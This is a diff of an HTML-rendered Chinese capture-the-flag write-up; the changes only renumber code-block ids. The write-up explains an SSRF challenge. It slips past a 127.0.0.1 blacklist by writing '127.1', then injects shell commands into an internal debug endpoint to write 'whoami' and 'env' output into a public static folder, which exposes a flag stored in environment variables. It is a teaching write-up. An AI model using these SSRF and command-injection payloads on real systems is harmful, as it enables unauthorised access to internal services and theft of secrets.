-<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>内部 API 地址   http://127.0.0.1:5001
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>接口列表        /api/product?id=1
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>                /api/debug?cmd=whoami
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>说明            内部 API 仅允许本地访问，且主站不回显内部响应
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>内部 API 地址   http://127.0.0.1:5001
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>接口列表        /api/product?id=1
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>                /api/debug?cmd=whoami
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>说明            内部 API 仅允许本地访问，且主站不回显内部响应
 </span></code></pre></div>
 <p><strong>两条信息很关键：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>① 内部服务只监听 127.0.0.1:5001，外网碰不到
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>② 主站不会把内部响应显示出来 —— 也就是说，就算打通了也是"盲"的
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>① 内部服务只监听 127.0.0.1:5001，外网碰不到
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>② 主站不会把内部响应显示出来 —— 也就是说，就算打通了也是"盲"的
 </span></code></pre></div>
 <h4 id="step-2-127001"><a class="toclink" href="../../zerog2026-stage2-ssrf/#step-2-127001">Step 2：直接打 127.0.0.1 — 失败</a></h4>
 <p>既然比价功能是"服务端抓取 URL"，那它就是天然的 SSRF 入口。直接把目标换成内部地址：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>http://127.0.0.1:5001/api/debug?cmd=whoami
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>http://127.0.0.1:5001/api/debug?cmd=whoami
 </span></code></pre></div>
 <p>返回：</p>
 <p><img alt="非法的 URL" src="../../../assets/images/zerog2026-stage2-ssrf/03-invalid-url.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>抓取失败
-</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>非法的 URL
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>抓取失败
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>非法的 URL
 </span></code></pre></div>
 <p>说明 <code>127.0.0.1</code> 被黑名单挡了。</p>
 <h4 id="step-3"><a class="toclink" href="../../zerog2026-stage2-ssrf/#step-3">Step 3：换一个写法绕过 — 成功</a></h4>
 <p><code>127.0.0.1</code> 有很多等价写法，只要目标解析到同一个地址、但不命中黑名单里的字符串就行：</p>
 <p><img alt="等价写法表" src="../../../assets/images/zerog2026-stage2-ssrf/04-bypass-table.png" /></p>
 <p>这里我用的是 <code>127.1</code>：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>http://127.1:5001/api/debug?cmd=whoami
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>http://127.1:5001/api/debug?cmd=whoami
 </span></code></pre></div>
 <p><img alt="用 127.1 打内部接口" src="../../../assets/images/zerog2026-stage2-ssrf/05-127-1-debug.png" /></p>
 <p>抓取成功了：</p>
@@ -3589,58 +3830,58 @@
 <p>既然拿不到回显，那就让内部命令自己把结果写到主站能访问到的地方。</p>
 <p><code>static</code> 这个目录是在源码里看到的：</p>
 <p><img alt="源码里的静态目录" src="../../../assets/images/zerog2026-stage2-ssrf/07-source-static.png" /></p>
-<div class="language-html highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">"stylesheet"</span> <span class="na">href</span><span class="o">=</span><span class="s">"/static/style.css"</span><span class="p">&gt;</span>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">"stylesheet"</span> <span class="na">href</span><span class="o">=</span><span class="s">"/static/style.css"</span><span class="p">&gt;</span>
 </span></code></pre></div>
 <p>构造 payload，把命令输出重定向进去：</p>
 <p><img alt="whoami 重定向到 out.txt" src="../../../assets/images/zerog2026-stage2-ssrf/08-redirect-out.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>http://127.1:5001/api/debug?cmd=whoami&gt;static/out.txt
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>http://127.1:5001/api/debug?cmd=whoami&gt;static/out.txt
 </span></code></pre></div>
 <p><strong>然后直接访问 <code>out.txt</code>。</strong></p>
 <h4 id="step-5-debug"><a class="toclink" href="../../zerog2026-stage2-ssrf/#step-5-debug">Step 5：输出里混进了 Debug — 需要闭合前一句</a></h4>
 <p>看 <code>out.txt</code> 时发现，命令的输出和 <code>Debug</code> 字样被一起打印了出来。所以猜测后端大概是：</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="k">return</span> <span class="s2">"Debug: "</span> <span class="o">+</span> <span class="n">cmd_result</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="k">return</span> <span class="s2">"Debug: "</span> <span class="o">+</span> <span class="n">cmd_result</span>
 </span></code></pre></div>
 <p>也就是说，<strong>我传的 <code>&gt;static/out.txt</code> 会把整个 <code>echo</code> 的结果改写进文件，而不只是命令输出。</strong></p>
 <p>所以要先把前面那句截断，让重定向只作用于我自己的命令：</p>
 <p><img alt="用分号闭合前一句" src="../../../assets/images/zerog2026-stage2-ssrf/09-close-statement.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>http://127.1:5001/api/debug?cmd=;whoami&gt;static/aa.txt
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>http://127.1:5001/api/debug?cmd=;whoami&gt;static/aa.txt
 </span></code></pre></div>
 <p>闭合之后输出就干净了：</p>
 <p><img alt="只输出了 root" src="../../../assets/images/zerog2026-stage2-ssrf/10-root.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>root
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>root
 </span></code></pre></div>
 <h4 id="step-6-flag"><a class="toclink" href="../../zerog2026-stage2-ssrf/#step-6-flag">Step 6：换命令找 flag — 先查环境变量</a></h4>
 <p>能写文件、能读文件，接下来就是找 flag。先查环境变量（比翻目录快）：</p>
 <p><img alt="env 重定向" src="../../../assets/images/zerog2026-stage2-ssrf/11-redirect-env.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>http://127.1:5001/api/debug?cmd=;env&gt;static/ea.txt
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>http://127.1:5001/api/debug?cmd=;env&gt;static/ea.txt
 </span></code></pre></div>
 <p>在 <code>ea.txt</code> 里找到了：</p>
 <p><img alt="环境变量里的 flag" src="../../../assets/images/zerog2026-stage2-ssrf/12-env-flag.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>ZEROG_2026_FLAG=flag{65e49f2f-8785-4b8a-809f-247089a45efd}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>ZEROG_2026_FLAG=flag{65e49f2f-8785-4b8a-809f-247089a45efd}
 </span></code></pre></div>
 <hr />
 <h3 id="_3"><a class="toclink" href="../../zerog2026-stage2-ssrf/#_3">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>首页只有 URL 输入框
-</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>  → 进「系统信息」页，读到内部 API：127.0.0.1:5001 与 /api/debug?cmd=
-</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>    → 直接填 127.0.0.1，被判定为"非法的 URL"
-</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>      → 换成 127.1（同一地址的等价写法），抓取成功
-</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>        → 但页面不回显内部响应（题目明说了）
-</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>          → 用命令重定向把结果写进 static/ 目录，再直接访问该文件
-</span><span id="__span-27-7"><a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a>            → out.txt 里混着 Debug 字样，说明前面有 echo
-</span><span id="__span-27-8"><a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a>              → 用 ; 截断前一句，输出变干净（root）
-</span><span id="__span-27-9"><a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a>                → 换 env 命令，拿到 ZEROG_2026_FLAG
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>首页只有 URL 输入框
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>  → 进「系统信息」页，读到内部 API：127.0.0.1:5001 与 /api/debug?cmd=
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>    → 直接填 127.0.0.1，被判定为"非法的 URL"
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>      → 换成 127.1（同一地址的等价写法），抓取成功
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>        → 但页面不回显内部响应（题目明说了）
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>          → 用命令重定向把结果写进 static/ 目录，再直接访问该文件
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>            → out.txt 里混着 Debug 字样，说明前面有 echo
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>              → 用 ; 截断前一句，输出变干净（root）
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>                → 换 env 命令，拿到 ZEROG_2026_FLAG
 </span></code></pre></div>
 <h4 id="_4"><a class="toclink" href="../../zerog2026-stage2-ssrf/#_4">漏洞原理</a></h4>
 <p><strong>① SSRF：服务端替我去请求</strong></p>
 <p><strong>比价功能必须由服务端抓取 URL，这个"抓取"没有限制目标 —— 于是可以把目标指向只有服务器自己能访问的 <code>127.0.0.1:5001</code>。</strong></p>
 <p><strong>② 黑名单只匹配字符串，不匹配语义</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>被拦：127.0.0.1
-</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>放过：127.1        ← 同一个地址，字符串不同
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>被拦：127.0.0.1
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>放过：127.1        ← 同一个地址，字符串不同
 </span></code></pre></div>
 <p><strong><code>127.1</code> 是 IPv4 的短格式，解析器会自动补全成 <code>127.0.0.1</code>。黑名单拦的是</strong>写法<strong>，不是</strong>地址<strong>。</strong></p>
 <p><strong>③ 无回显：把输出换成"写入可访问路径"</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>正常思路   命令 → 响应 → 我看
-</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>无回显     命令 → 重定向写文件 → 我再访问那个文件
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>正常思路   命令 → 响应 → 我看
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>无回显     命令 → 重定向写文件 → 我再访问那个文件
 </span></code></pre></div>
 <p><strong>④ 闭合：输出里混了别的东西，说明它被包在一句话里</strong></p>
 <p><strong>看到 <code>Debug:</code> 和命令结果一起出现，就知道后端大概在做字符串拼接。<code>;</code> 把前一句结束掉，重定向才只作用于我的命令。</strong></p>
